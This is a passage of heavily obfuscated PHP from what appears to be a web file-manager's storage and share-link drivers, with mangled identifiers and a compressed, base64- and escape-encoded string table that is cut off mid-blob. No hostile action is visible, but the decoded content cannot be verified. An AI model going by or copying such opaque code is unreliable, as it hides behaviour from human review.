ûö = implode($Èğ•¦ŒÇ[8], array_splice($º¸ª·â´, 1)); return $this->model->pathInfoByPath($º¸ª·â´[0], $î· ûö); } public function hashSimple($é¤Üƒ¡¾) { $“‰“¢¢‡ =& $_SERVER[³·—™¤¢]; $™Èæ·Óù = $this->infoWithChildren($é¤Üƒ¡¾); return $™Èæ·Óù[$“‰“¢¢‡[170]][$“‰“¢¢‡[177]]; } public function hashMd5($ˆŸîîğå) { $Å°ê¦ˆ =& $_SERVER[³·—™¤¢]; $üãµ¥¶ = $this->infoWithChildren($ˆŸîîğå); return $üãµ¥¶[$Å°ê¦ˆ[170]][$Å°ê¦ˆ[176]]; } public function exist($Úç£À÷Û) { $‚×²Öì÷ =& $_SERVER[³·—™¤¢]; $§¶Üß– = $this->parse($Úç£À÷Û); if (!$§¶Üß–[$‚×²Öì÷[84]]) { return $this->isFile($Úç£À÷Û) || $this->isFolder($Úç£À÷Û); } $à±À¡ù  = array($‚×²Öì÷[401] => $§¶Üß–[$‚×²Öì÷[399]], $‚×²Öì÷[32] => $§¶Üß–[$‚×²Öì÷[84]]); $ø´ÅÉ› = $this->model->where($à±À¡ù )->find(); return $ø´ÅÉ› ? !0 : !1; } public function isFile($÷¯¨öˆş) { $…îíª =& $_SERVER[³·—™¤¢]; $‹ºûÇå³ = $this->infoSimple($÷¯¨öˆş); return $‹ºûÇå³ && $‹ºûÇå³[$…îíª[410]] == $…îíª[88] ? !1 : !0; } public function isFolder($ºÓÍ†¶£) { $íÖİÒÊè =& $_SERVER[³·—™¤¢]; $šÕ¦½ˆœ = $this->infoSimple($ºÓÍ†¶£); return $šÕ¦½ˆœ && $šÕ¦½ˆœ[$íÖİÒÊè[410]] == $íÖİÒÊè[88] ? !0 : !1; } public function listPath($áæ‹ôÇ·, $û˜é™‰ = false) { $§Ü³Ìµ¡ =& $_SERVER[³·—™¤¢]; if ($áæ‹ôÇ· == $§Ü³Ìµ¡[12]) { return !1; } $Ÿ§‹ú…¸ = array($§Ü³Ìµ¡[401] => $áæ‹ôÇ·); if ($û˜é™‰) { return $this->model->listSource($Ÿ§‹ú…¸, -1); } return $this->model->listSource($Ÿ§‹ú…¸); } public function has($ˆŒ§, $Ü½·«ª = false, $Ô€“¦Äˆ = null) { $Àó¹Ò×æ =& $_SERVER[³·—™¤¢]; $®•ˆØË¢ = $this->infoWithChildren($ˆŒ§); if ($Ü½·«ª) { return array($Àó¹Ò×æ[208] => $®•ˆØË¢[$Àó¹Ò×æ[208]], $Àó¹Ò×æ[207] => $®•ˆØË¢[$Àó¹Ò×æ[207]]); } return $Ô€“¦Äˆ ? $®•ˆØË¢[$Àó¹Ò×æ[208]] : $®•ˆØË¢[$Àó¹Ò×æ[207]]; } public function listAll($ãôí—Ëª) { $´€ÈŞâ = IO::info($this->pathParse[$_SERVER[³·—™¤¢][84]]); if (!$´€ÈŞâ) { return array(); } return $this->model->listAll($ãôí—Ëª); } public function getContent($¾—²óç) { return $this->model->getContent($¾—²óç); } public function setContent($»ü¹¸ë², $á¢ù™®Ù = '') { return $this->model->setContent($»ü¹¸ë², $á¢ù™®Ù); } public function fileSubstr($¼öÜš‹´, $óš¥¥õĞ, $êıìÓ¸’) { return $this->model->fileSubstr($¼öÜš‹´, $óš¥¥õĞ, $êıìÓ¸’); } public function download($ùÍ³Ëåƒ, $©¨³ìì = '') { $ÅñŒÉÛˆ = get_path_father($©¨³ìì); $”Á‹ÓşÄ = get_path_this($©¨³ìì); $åä³Ó‡¬ = $this->model->fileInfoGet($ùÍ³Ëåƒ); $ùâ³âì¯ = IO::copy($åä³Ó‡¬[$_SERVER[³·—™¤¢][84]], $ÅñŒÉÛˆ, !1, $”Á‹ÓşÄ); return $ùâ³âì¯; } public function setModifyTime($İ£½ªÙ‚, $öææ–ã“ = '') { $¼ºá×¨½ =& $_SERVER[³·—™¤¢]; if (!$İ£½ªÙ‚) { return; } $this->model->where(array($¼ºá×¨½[417] => $İ£½ªÙ‚))->save(array($¼ºá×¨½[85] => $öææ–ã“)); } public function upload($àŠËè¡¾, $äŞ”ş¶´, $†²€¡³• = false, $…¹•ÆÂ£ = REPEAT_REPLACE) { $»ƒğŞ‡Ï =& $_SERVER[³·—™¤¢]; $ê¦‰Êë = $this->parse($àŠËè¡¾); $á­¦›½– = $this->model->addFile($ê¦‰Êë[$»ƒğŞ‡Ï[399]], $äŞ”ş¶´, $ê¦‰Êë[$»ƒğŞ‡Ï[84]], $†²€¡³•, $…¹•ÆÂ£); return $this->getPathOuter($á­¦›½–); } public function uploadFileByID($‡¸¾ÇÖ, $Ë”ø¾»Î, $ŸëÉ¼Ë) { $ùÏÒœ½Ë =& $_SERVER[³·—™¤¢]; $—İÕÅ¿ = $this->parse($‡¸¾ÇÖ); $Â€ùÉ› = $this->model->addFileByFileID($—İÕÅ¿[$ùÏÒœ½Ë[399]], $Ë”ø¾»Î, $—İÕÅ¿[$ùÏÒœ½Ë[84]], $ŸëÉ¼Ë); return $this->getPathOuter($Â€ùÉ›); } public function addFileByRemote($·ÚÕÏªâ, $—¬¬ø‰ì, $ˆŒÂÊú = array(), $Ç“ÒÌ¹ª = '', $¤Î§¥¼) { $—ÑÍÏÄç =& $_SERVER[³·—™¤¢]; $Ÿûöë¹¯ = $this->parse($·ÚÕÏªâ); $Ç“ÒÌ¹ª = empty($Ç“ÒÌ¹ª) ? $Ÿûöë¹¯[$—ÑÍÏÄç[84]] : $Ç“ÒÌ¹ª; $¢óˆ¤­Œ = $this->model->addFileByRemote($Ÿûöë¹¯[$—ÑÍÏÄç[399]], $—¬¬ø‰ì, $Ç“ÒÌ¹ª, $ˆŒÂÊú, $¤Î§¥¼); return $this->getPathOuter($¢óˆ¤­Œ); } public function uploadLink($¢êÑÑŸ, $ı“È›¢º = 0) { $êàİª´è =& $_SERVER[³·—™¤¢]; $€ŒÌ±“³ = $this->parse($¢êÑÑŸ); $ŞŒ€®« = _get($GLOBALS[$êàİª´è[7]], $êàİª´è[1352]); $ã„¦ºÒ¦ = _get($GLOBALS[$êàİª´è[7]], $êàİª´è[1353]); $¢êÑÑŸ = Model($êàİª´è[609])->createFileName($€ŒÌ±“³[$êàİª´è[84]], $ŞŒ€®«, $ã„¦ºÒ¦); return IO::uploadLink($¢êÑÑŸ, $ı“È›¢º); } public function fileNameAuto($¾Ş¸îû, $¬ˆÈ¯Óû, $ù‚Ó¡®Õ = REPEAT_REPLACE, $öËºÖÅÜ = false) { return $this->model->fileNameAuto($¾Ş¸îû, $¬ˆÈ¯Óû, $ù‚Ó¡®Õ, $öËºÖÅÜ); } public function fileNameExist($Ôõõ¿ã, $­ÛŞ²Ì) { return $this->model->fileNameExist($Ôõõ¿ã, $­ÛŞ²Ì); } protected function _fileOut($É¢Ÿˆ¡Œ, $«àé­Â© = false, $ˆæö˜Í· = false, $À÷êË‰Û = '', $ÉÌõºŞ = false) { $Í—±Ø½¢ =& $_SERVER[³·—™¤¢]; $ğçë“ïà = $this->model->sourceInfo($É¢Ÿˆ¡Œ); if ($ğçë“ïà[$Í—±Ø½¢[410]] == $Í—±Ø½¢[88]) { header($Í—±Ø½¢[1354]); die; } $¶ŸİÙ£ = $this->model->fileInfoGet($É¢Ÿˆ¡Œ); $À÷êË‰Û = $¶ŸİÙ£[$Í—±Ø½¢[176]] ? $¶ŸİÙ£[$Í—±Ø½¢[176]] : $À÷êË‰Û; $÷ùÔ…ü = isset($GLOBALS[$Í—±Ø½¢[1355]]) ? $GLOBALS[$Í—±Ø½¢[1355]] : $ğçë“ïà[$Í—±Ø½¢[32]]; if ($ÉÌõºŞ) { return IO::fileOutServer($¶ŸİÙ£[$Í—±Ø½¢[84]], $«àé­Â©, $÷ùÔ…ü, $À÷êË‰Û); } IO::fileOut($¶ŸİÙ£[$Í—±Ø½¢[84]], $«àé­Â©, $÷ùÔ…ü, $À÷êË‰Û); } public function fileOut($¸ëÇÈª, $ı»»™«ˆ = false, $ûŸˆÓÆê = false, $îøäùú¬ = '') { $this->_fileOut($¸ëÇÈª, $ı»»™«ˆ, $ûŸˆÓÆê, $îøäùú¬); } public function fileOutServer($‡ÅÆ·™„, $•¤ıĞê‘ = false, $¢¤ä¯Ğ‰ = false, $°§©úÜà = '') { $this->_fileOut($‡ÅÆ·™„, $•¤ıĞê‘, $¢¤ä¯Ğ‰, $°§©úÜà, !0); } protected function _fileOutImage($à÷ıë‡, $Ô­¡‰ü™ = 250) { $…Áç¸áí =& $_SERVER[³·—™¤¢]; $ı®°…îÊ = $this->model->pathInfo($à÷ıë‡); if ($ı®°…îÊ[$…Áç¸áí[410]] == $…Áç¸áí[88]) { show_json($…Áç¸áí[1356] . $à÷ıë‡, !1); } $™çÔ¤ô = $this->model->fileInfoGet($à÷ıë‡); $™çÔ¤ô[$…Áç¸áí[32]] = $ı®°…îÊ[$…Áç¸áí[32]]; $™çÔ¤ô[$…Áç¸áí[169]] = $ı®°…îÊ[$…Áç¸áí[169]]; $GLOBALS[$…Áç¸áí[1355]] = $™çÔ¤ô[$…Áç¸áí[32]]; $GLOBALS[$…Áç¸áí[168]] = $™çÔ¤ô; IO::fileOutImage($™çÔ¤ô[$…Áç¸áí[84]], $Ô­¡‰ü™); } public function fileOutImage($¤‰Æ…¨“, $Â»É¹„› = 250) { $this->_fileOutImage($¤‰Æ…¨“, $Â»É¹„›); } public function fileOutImageServer($†ç˜‚Ú¦, $ŸâÈ²®¡ = 250) { $this->_fileOutImage($†ç˜‚Ú¦, $ŸâÈ²®¡); } public function link($ÃÖ­ß—Ü, $Éµ­ä¨© = '') { $±ô…ï = $this->model->fileInfoGet($ÃÖ­ß—Ü); return IO::link($±ô…ï[$_SERVER[³·—™¤¢][84]], $Éµ­ä¨©); } protected function parse($ÊˆÍÉ•) { $ßÎáÔÖØ =& $_SERVER[³·—™¤¢]; if (strstr($ÊˆÍÉ•, $ßÎáÔÖØ[8]) === !1) { return array($ßÎáÔÖØ[419] => intval($ÊˆÍÉ•), $ßÎáÔÖØ[84] => $ßÎáÔÖØ[12], $ßÎáÔÖØ[1351] => array()); } $Îµ¡ö¯… = explode($ßÎáÔÖØ[8], trim($ÊˆÍÉ•, $ßÎáÔÖØ[8])); if (count($Îµ¡ö¯…) < 2) { show_tips(clear_html($ÊˆÍÉ•) . $ßÎáÔÖØ[1357]); } return array($ßÎáÔÖØ[419] => intval($Îµ¡ö¯…[0]), $ßÎáÔÖØ[84] => $Îµ¡ö¯…[1], $ßÎáÔÖØ[1351] => array_slice($Îµ¡ö¯…, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($åğŞ¹Ë¯) { $this->pathParse = $åğŞ¹Ë¯; $this->model = Model($_SERVER[³·—™¤¢][1350]); } public function getPathOuter($óêº¨Æ) { $–çÕ¶¾Ã =& $_SERVER[³·—™¤¢]; if (!$óêº¨Æ) { return $óêº¨Æ; } $Èêëô±É = $this->parse($óêº¨Æ); return trim(KodIO::makeShare($this->pathParse[$–çÕ¶¾Ã[399]], $Èêëô±É[$–çÕ¶¾Ã[399]]), $–çÕ¶¾Ã[8]); } protected function infoParse($ˆÕò÷«ö, $¼·œ£ = false, $À¹úÅ»¡ = false) { $Çüæ¹¯« =& $_SERVER[³·—™¤¢]; $¼„×¾•· = $this->pathParse[$Çüæ¹¯«[399]]; $“¶ä™°ş = trim($this->pathParse[$Çüæ¹¯«[1192]], $Çüæ¹¯«[8]); return Action($Çüæ¹¯«[1358])->sharePathInfo($¼„×¾•·, $“¶ä™°ş, $¼·œ£); } public function infoFull($’É¥¾İ†) { $‹¡ä‰˜Ì =& $_SERVER[³·—™¤¢]; $°šˆ˜èÒ = explode($‹¡ä‰˜Ì[8], trim($’É¥¾İ†, $‹¡ä‰˜Ì[8])); if (count($°šˆ˜èÒ) > 1) { $Á°î¨†© = implode($‹¡ä‰˜Ì[8], array_splice($°šˆ˜èÒ, 1)); $Ô‘›ßØÁ = $this->model->pathInfoByPath($°šˆ˜èÒ[0], $Á°î¨†©); if (!$Ô‘›ßØÁ) { return !1; } $this->pathParse[$‹¡ä‰˜Ì[1192]] = $Ô‘›ßØÁ[$‹¡ä‰˜Ì[402]]; } return $this->infoParse($’É¥¾İ†); } public function listAll($¬Ù¯–şÅ) { $Ş»÷Ÿ‚Ú =& $_SERVER[³·—™¤¢]; $æ¼Ã· = IO::info($this->pathParse[$Ş»÷Ÿ‚Ú[84]]); if (!$æ¼Ã·) { return array(); } $Ÿ¤ûÈÀ = $this->model->listAll($¬Ù¯–şÅ); $‹µ“ü¨ª = Model($Ş»÷Ÿ‚Ú[601])->getInfo($æ¼Ã·[$Ş»÷Ÿ‚Ú[489]]); $Šªó°´Ş = Action($Ş»÷Ÿ‚Ú[1358]); foreach ($Ÿ¤ûÈÀ as &$Íı®ØÓï) { check_abort(); $Íı®ØÓï[$Ş»÷Ÿ‚Ú[86]] = $Šªó°´Ş->_shareItemeParse($Íı®ØÓï[$Ş»÷Ÿ‚Ú[86]], $‹µ“ü¨ª); } unset($Íı®ØÓï); return $Ÿ¤ûÈÀ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($°‰†ËÏı) { $this->pathParse = $°‰†ËÏı; $this->model = Model($_SERVER[³·—™¤¢][1350]); } protected function infoParse($² œ‰Š, $ÃßËæÏ = false, $—¨Ö‚ìš = false) { $Ã’œß­¾ =& $_SERVER[³·—™¤¢]; return Action($Ã’œß­¾[1198])->sharePathInfo($this->pathParse[$Ã’œß­¾[84]], !0, $ÃßËæÏ); } public function listPath($šÇéÌ˜™, $ášş¬³† = false) { $ÏºŸ§ ¸ =& $_SERVER[³·—™¤¢]; $­Âûúøö = parent::listPath($šÇéÌ˜™, $ášş¬³†); if (!$­Âûúøö) { return $­Âûúøö; } if (is_array($­Âûúøö[$ÏºŸ§ ¸[1359]])) { $­Âûúøö[$ÏºŸ§ ¸[1359]] = Action($ÏºŸ§ ¸[1198])->shareItemInfo($­Âûúøö[$ÏºŸ§ ¸[1359]]); } foreach ($­Âûúøö as $ñ¥àÏÂ => $˜ÔÉÅ± ) { if (!in_array($ñ¥àÏÂ, array($ÏºŸ§ ¸[83], $ÏºŸ§ ¸[82]))) { continue; } foreach ($˜ÔÉÅ±  as $¥™ÀŠÌ => $ŞêçìµŒ) { $­Âûúøö[$ñ¥àÏÂ][$¥™ÀŠÌ] = Action($ÏºŸ§ ¸[1198])->shareItemInfo($ŞêçìµŒ); } } return $­Âûúøö; } public function listAll($äìÔÖÙ§) { $™Üè™¨û =& $_SERVER[³·—™¤¢]; $ÉëşÀê¾ = IO::info($this->pathParse[$™Üè™¨û[84]]); if (!$ÉëşÀê¾) { return array(); } $ÈÒ–ÓæÌ = $this->model->listAll($äìÔÖÙ§); foreach ($ÈÒ–ÓæÌ as &$±àñ¿œ) { $±àñ¿œ[$™Üè™¨û[86]] = Action($™Üè™¨û[1198])->shareItemInfo($±àñ¿œ[$™Üè™¨û[86]]); } unset($±àñ¿œ); return $ÈÒ–ÓæÌ; } } goto aÑŒ…¨„“; bª‘È•ŸÖŒ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xb3\xb7\x97\x99\xa4\xa2", "\303\231\216\220\211\370"); $_SERVER[³·—™¤¢] = explode("\174\1\174\5\174\1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x9\x98\x1c\x55\xd5\x30\xcc\xa2\xb2\x88\x8a\x2\x6e\xbc\x68\x31\x10\x66\xeb\x65\xb2\x4c\x96\x49\x26\x49\x67\xa6\x67\xa6\x49\x4f\xf7\xa4\xbb\x27"."\13\63\241\123\335\135\63\135\231\352\252\236\252\352\331\222\260\357\201\40\253\10\101\24\1\201\10\4\20\136\26\303\42\213\242\210\54\212\200\200\202\44\1\145\107\120\136\24".strrev('NÆó]ç[êùî7gãsÜm?üó~ÿ…Ó{œç¹Î{ço»®’óÏóÿ¼uT»œ»¿')."\xfa\xbd\x71\x2f\xf4\xdf\x67\xe8\xf7\xb7\x37\xef\xbb\x7\xf9\x73\xd0\xe6\xb3\x1a\x1a\x7a\xe6\xee\xdf\x9c\x38\xe0\xdc\x9f\xde\xa0\xee\xb5\xec\xe2\x7f\x3e\xf8\xd3\x47\xb7\xfe\xee\xcf\x8f\x5e\x9f"."\x29\x2c\xbe\x6b\xeb\xf0\xb7\xf6\x38\xf9\x3f\xe7\x37\xb5\xa1\xac\xb4\x64\x1b\xfd\x51\x4c\xcb\x55\xb4\x9\xdd\x71\x1d\x1a\x91\xb7\xcc\x21\x7d\x98\x7e\xeb\x26\xfd\xd\xd3\x9f\xfe\x54\xdc\xd6\x4a"."\x96\xab\xd1\x60\x88\xfe\x64\xa1\x57\xe4\x5f\x67\xd4\xd0\x59\x7a\x36\x91\xcc\x64\xd3\xfd\x7d\x7d\xd1\x54\x6\x32\xb5\xc9\xe9\x25\xab\x0\x5f\x65\xd5\x56\x4b\xd0\x7e\x59\xb3\x1d\xd4\x1b\xb9\xba"."\154\331\52\153\246\47\106\104\24\124\127\315\251\16\324\324\271\54\333\31\355\213\47\327\144\63\153\372\242\220\43\227\35\255\150\366\44\15\221\317\264\253\332\156\106\57\151\74"."\xc7\xb8\xcd\xfb\xb5\x2c\xda\x1d\x4b\x28\x99\x54\x24\x91\x8e\x74\x64\x62\xc9\x4\x8d\xee\x48\xf6\xf6\xc6\x32\xd5\xf1\xa9\x64\x3c\xbe\x2c\xd2\xb1\xbc\x3a\xa5\x2f\x15\xe9\xee\x8d\x28\xa8\x7f\x86"."\226\325\315\41\253\101\131\107\123\326\51\215\364\243\113\327\214\2\375\64\125\326\35\167\262\14\137\31\376\205\226\311\254\30\6\15\44\370\127\101\33\122\53\6\314\126\247\34"."\50\333\172\111\145\203\136\256\115\362\130\372\241\126\134\113\67\363\64\20\235\160\155\125\304\243\276\346\321\102\153\46\124\225\216\306\243\35\31\5\167\120\351\112\45\173\25\130".base64_decode('hJLquJqtrOqJpqIK7nR7PRlrvQLwkkBToUTicWW6GlytVGbV0DI1KkumOqMpZdka')."\x45\xcc\x50\xde\x2a\x95\x2c\x33\x84\x6a\x41\x2b\xe9\x4a\x5d\x8d\xa6\x52\xf4\x23\x0\xe0\x1d\x8f\xe1\x45\x83\x40\xb2\xab\x2b\x1d\xe5\x21\x18\xdc\x8a\x38\xea\xc9\x6c\x80\x4f\x4f\xa8\x30\x64\xb8"."\xd9\x31\xd5\xa8\x30\x30\x1d\xa1\xbf\xf5\xf0\x3\xbf\x96\x3\xa0\x3b\xaa\x9b\x7a\x5\xc0\x14\xaa\xb0\x2c\xbe\xad\xe0\xa3\xc2\x72\x6b\x2c\x46\x2b\xc0\x47\x9\x95\xb7\x60\xe7\xa1\x6d\x38\x46\x3f"."\333\27\323\337\205\220\51\227\305\151\232\355\146\65\63\157\25\164\23\66\353\22\0\72\325\55\166\332\72\312\100\303\103\226\121\140\337\216\76\5\103\31\322\15\55\121\51\311"."\x59\x78\x30\x5f\xd4\x8d\x82\xcd\xf6\xd7\x27\xe5\xa4\xc1\x38\xdf\xae\x38\xaf\x8\x95\x51\x4f\xf8\x4e\xd7\x87\x26\xc5\x7e\x73\xac\x8a\x9d\xd7\x62\x68\x47\x88\x72\x7d\x3c\xf7\x4c\xc8\xa4\xb9\x2e"."\32\34\314\215\156\365\227\15\113\55\244\65\233\17\115\267\272\120\301\144\305\225\43\53\44\133\227\145\227\72\21\146\200\366\321\256\320\373\153\44\214\260\175\121\220\146\54\334".strrev('Y­{ê¢Ù’Æ'."\r".'Q†nœ„dØuhT§„Ú²0ÍEO¡ú€?ÑKµãğbp0')."\122\212\141\324\202\66\21\52\27\313\260\253\371\106\36\364\0\66\236\272\204\345\106\45\274\154\130\171\325\220\207\110\277\213\256\133\116\153\146\1\317\4\14\305\32\67\311\114"._kodDe('LCeHJP/4Z3SGncRDnsxsKOYHeQsefe6Afyu5xC5Sj0u9lAorER5oM8asdSI1yo5ckA==')."\xb9\x6c\xe8\x79\xd5\xd5\x2d\x33\x6c\xe5\x5d\xcd\xd\x3a\xae\xad\xa9\x50\x63\x24\x9f\xd7\x1c\x27\xd8\x61\x99\xae\x6d\x19\xc1\x88\x61\x58\xe3\xc1\xa4\xad\xf\xeb\x66\x9b\xd2\x4\xc8\x16\x25\xa2"."\x4d\x1d\xc4\x8\xb0\xd\x76\x6a\xdd\x42\x5\x3\xa\x6e\xa6\xa9\xbd\xe2\xe\x5\xe7\xb3\x1d\xc8\x73\xdb\xaa\xe9\xc\x69\x76\x30\xa\x3b\xa3\x4d\x41\x9d\xe5\x58\x90\x65\xeb\xd4\x9d\xb2\xe5\xe8"."\270\173\155\212\352\272\152\276\210\61\210\250\276\375\23\362\353\246\241\233\132\125\336\350\104\131\267\65\207\365\125\351\356\315\100\45\250\166\55\330\147\253\303\45\265\115\51\127"."\x72\x68\x66\x60\xa7\xd6\x88\xa3\xb9\x61\x6a\xda\x94\x3c\xe\x6\x94\x52\xc5\x71\x83\xb6\x86\x50\x91\x8e\x8e\x3b\x98\xe4\xd8\x50\xb0\x17\xef\x2b\x5d\x2b\x4\xd3\x8\x63\x43\xf4\xec\x96\x39\xa"."\x2\x1d\x85\xa5\xd1\xd8\x9e\x4c\xa6\x2f\x1b\xeb\x42\x47\x72\x22\x9a\xed\x8d\x64\x3a\x7a\xa0\xdb\xae\x3a\xcc\xfa\x1c\x47\x78\x98\x57\xc9\x22\x57\x7\xd1\xfe\xc2\xc0\x95\x40\x63\x15\x91\x7d\xd6"."\270\146\243\206\227\115\266\51\43\126\41\147\115\204\130\22\316\234\106\210\206\145\306\313\135\166\203\51\325\34\306\363\223\233\164\65\0\101\147\154\330\73\321\161\315\34\166\213"."\254\140\72\232\132\31\115\145\323\311\256\314\252\110\52\12\73\6\101\311\4\153\12\127\155\4\123\132\1\115\175\336\145\345\324\62\236\65\226\7\157\16\274\126\54\25\157\30"."\x96\x16\x8f\x75\xe3\x89\xe9\xc\x3a\x28\x53\x50\xce\xc5\xea\x8e\xeb\x25\x1d\xf7\xdd\xe5\x29\x64\x26\xd1\x49\xdf\xd\x1d\xa\x93\x1\xb5\xf\x16\x9b\x1a\x6\xb\xcd\x8d\x41\xf4\x6f\x53\xe3\xc0"."\x60\x67\xa8\x69\xed\x92\xb0\x2e\xca\x84\x67\x86\x66\x2a\xb3\x5a\xe6\x2a\x7d\x88\xf4\xd0\x55\x43\x81\x41\x57\xe5\x68\x51\x92\xcb\xbd\xd3\x22\xa0\xd9\xb4\x4c\xed\x13\x26\x7\x9f\x5d\xd2\xb6\xf7"."\115\53\215\114\105\127\364\107\323\231\154\157\64\323\223\354\204\326\243\21\370\212\133\164\333\262\321\16\320\237\265\260\272\153\351\117\126\167\272\244\143\5\7\71\372\311\132\271"."\365\150\61\172\65\206\143\207\50\216\216\225\324\141\37\312\307\241\136\313\326\274\61\342\250\132\245\27\330\231\200\203\75\232\76\134\204\371\322\161\155\171\313\260\154\325\300\230"."\221\155\12\215\141\253\141\35\260\25\40\141\21\110\353\245\62\353\254\133\254\224\162\322\47\140\173\7\301\17\303\145\105\213\237\147\226\15\137\155\141\310\70\143\126\27\303\366"."\341\364\154\364\277\100\355\5\253\244\62\104\111\120\234\126\240\70\216\106\65\171\122\172\64\125\34\322\256\355\132\70\326\366\144\101\23\132\264\140\141\207\65\326\245\12\357\33"."\353\145\101\63\64\66\33\105\215\35\23\55\220\15\35\163\174\256\206\370\232\41\152\17\305\212\363\131\167\122\250\44\106\352\54\274\12\223\307\42\302\345\131\15\164\102\45\311".strrev('FÌépe,TªÌi©"‰’;gÕÔpH'."\n".'À@VƒFÂ=ª½"´MI°é'."\r".'­Ÿp‹Š')."\72\372\370\301\53\126\24\62\140\4\123\175\172\320\230\261\131\320\161\324\235\260\70\346\20\306\56\133\246\243\5\363\120\102\220\336\125\111\5\161\12\0\236\21\47\207\357\60"."\230\10\252\245\251\140\11\155\201\40\357\250\367\14\126\62\362\121\36\203\125\22\310\35\117\43\342\212\330\341\337\227\114\103\201\45\70\26\21\140\71\315\206\306\372\372\41\251"."\x24\x41\x48\x77\x14\x22\xf7\x67\xe7\xb9\xa\x64\x55\x64\x55\x9a\x21\xe6\xa\xca\x6f\xeb\x53\xaa\x18\xd2\x12\xd6\x1f\x36\x90\x92\x21\xe8\x39\xef\xa8\x82\x62\xe6\x33\x3d\xb1\xc4\xf2\x6c\x6f\xb2"."\x33\x1a\xcf\xc6\x12\x8\x33\x65\xaa\xe3\xfb\xfb\x3a\x23\x6c\x29\xe5\xf8\x65\xc9\x4c\x8f\x27\xb6\x1f\xe1\xa6\x95\x91\x78\xcc\x9f\x3d\xba\x3a\x96\xce\xa4\x6b\x26\xa1\xb8\xfe\xa8\x2f\x5\x31\x82"."\175\251\150\127\154\65\17\166\305\242\361\316\164\266\43\322\321\43\362\44\42\275\20\310\16\141\126\314\11\173\363\147\21\222\115\163\206\56\73\206\231\123\66\131\131\17\17\225"."\145\334\101\126\300\20\72\114\65\200\64\30\56\146\211\311\110\200\41\316\133\25\166\4\160\102\262\304\160\104\111\205\115\244\262\203\262\201\376\64\52\221\264\342\226\263\34\33"."\xe4\x26\xf9\x27\x19\x6\xb\x23\x92\x11\xda\x57\x0\xe1\x57\xf5\x20\x8b\xf3\x2c\xd3\x86\x38\x1e\xae\x1d\x11\x19\x72\x39\xba\xf7\x85\x11\xf0\x8b\x34\xb4\x2\x11\xc2\x7b\x23\x48\x20\x2b\x2\xcd"."\xe8\x68\x2b\xd9\x6e\x84\x75\x67\x48\xf0\xbd\xd9\x64\x5f\x34\x15\xc1\x5c\x73\x76\x55\x2a\x99\xe8\x86\x2\xe3\x45\x8d\x75\x20\x6\xd3\xdf\xc0\x88\x2b\x60\x9e\x5d\x81\x90\x10\x65\xa4\x32\x2e\x4a".base64_decode('TPp6i03lRvpzFP1BRCE0rpls1nMYN7PThX0Mod3A8KpV4a3lLMtg+xTRBxxhcOZ7')."\xbd\xc3\x80\x64\x82\xa1\x9a\x66\x76\x40\xc1\xf9\x90\x49\x2e\x8f\x26\xb2\xc\xb2\x68\x48\x82\x46\x1a\x81\xd8\xd9\x64\xa\x26\xc4\xb5\x46\x18\x4f\x46\x13\x53\xd1\x34\xdb\xe5\xb6\x36\x5a\xd1\xd9"."\164\205\103\315\0\305\32\72\202\240\371\360\261\203\343\315\15\3\301\346\320\132\364\321\330\264\224\6\41\64\30\362\4\217\204\362\25\233\227\306\144\123\203\263\244\261\155\60"."\74\30\156\130\322\66\20\11\116\251\301\251\226\340\202\340\332\346\301\120\143\63\104\254\335\60\53\60\147\23\316\200\62\56\71\142\55\372\151\37\134\62\143\60\170\324\161\353"."\x96\xe\xc\xae\xad\x6f\x6b\x3e\x7c\x30\x74\xc4\xe0\xf8\xda\xa6\xc6\x25\xac\x9d\x7c\xc5\x46\xfc\x66\x7e\x92\x77\xb5\xd0\xdc\x80\xba\x84\xc8\x29\x9e\xc5\x24\x28\x4f\xca\xc0\x12\xa6\xf4\xb2\x88"."\335\60\167\23\213\107\153\250\15\213\22\3\301\301\346\265\113\244\162\122\224\277\55\104\56\41\374\133\344\371\42\301\143\360\310\170\121\274\357\1\76\52\146\136\140\117\274\57".strrev('wÁ—,>mL!‰”}LVtnæ'."\r".'CÚÃ¶&ïè3'."\r".'ø©{§ÎtÎ„-òl>€ğjr')."\116\163\307\65\6\36\50\336\23\106\300\301\130\107\224\44\205\14\102\30\102\13\230\241\342\60\312\201\111\57\147\61\205\65\316\103\5\315\204\165\332\17\162\73\171\265\254\245"."\245\21\146\263\231\310\262\170\64\313\60\14\140\142\26\46\130\161\31\27\331\241\241\11\214\312\360\103\136\220\360\204\133\201\235\357\214\32\12\101\14\212\146\333\226\335\106\244".base64_decode('l06ljEkzxJm5aG4VxNMr7YsVOuVQLisvQFlldALmtjWx6TGGgj6VxQo5iKBi1E24')."\x61\x70\xb0\x32\xa0\x15\xd6\xe\x20\xc0\x57\x83\x43\x6b\x37\xcc\xde\xd4\xc8\xa8\xfc\xf0\x20\xfa\xc3\x2\x91\x1a\x72\xb4\x2c\xc7\x86\x59\x74\x3e\x87\x70\x3f\xb8\x28\xc5\x13\xe0\xc9\x34\x68\xd9"."\234\104\52\173\210\150\327\162\125\303\123\105\6\307\60\324\304\16\156\20\52\320\325\216\13\214\205\217\162\111\0\111\320\151\202\63\361\134\66\42\111\300\160\211\264\346\206\170"."\x8e\x80\x94\x98\x45\x61\x8f\x30\xb8\xbd\x8e\x21\x7b\x13\x6d\xa7\xe\xe9\xa8\xa3\xa2\x9d\xf4\xa4\xe3\x6a\x25\x8f\xd4\xd2\xd1\x54\x3b\x5f\xec\xaa\x18\x86\xcb\x49\x79\x43\x1f\x81\x16\x60\xaf\x80"."\20\65\10\247\101\163\255\242\135\226\315\70\342\46\350\106\135\123\255\214\61\323\104\374\253\14\152\342\220\355\216\40\162\46\243\64\60\201\237\22\113\50\313\222\311\170\64\222"."\120\360\171\16\347\20\42\26\322\321\276\10\72\304\60\157\235\316\104\101\6\31\353\14\262\172\127\7\143\300\141\361\17\35\246\335\52\143\14\222\105\163\222\105\234\314\10\133"."\x4b\x84\x10\x5d\x96\x15\xe4\x65\x10\xc2\x84\x66\x0\x4b\x88\x2\x98\xd2\x8\xa0\x31\x4\x30\x7b\x14\x10\x54\x7c\x40\x8\xdc\x2\x63\xba\x36\x4e\x3e\x38\xb1\x1d\x0\x1a\x3c\xe0\xaa\x36\x22\x18".base64_decode('MJEMn7HOgO50EgaCNECSW